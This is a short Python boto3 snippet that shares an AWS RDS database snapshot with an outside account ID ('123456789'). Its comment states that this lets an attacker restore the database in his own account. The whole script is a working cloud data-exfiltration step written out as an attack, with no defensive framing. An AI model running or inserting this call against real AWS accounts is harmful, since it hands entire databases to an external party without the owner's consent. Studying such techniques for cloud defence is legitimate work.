import boto3

# Create an RDS client
rds_client = boto3.client('rds')
# Define the RDS snapshot 
snapshot_id = 'my-db-snapshot'
# Define the AWS account ID to share with
account_id = '123456789'

# Share the RDS Snapshot with the external account
rds_client.modify_db_snapshot_attribute(
  DBSnapshotId=snapshot_id,
  AttributeName='restore',
  # This will allow an attacker to restore the db snapshot within his account
  ValuesToAdd=[account_id]
)












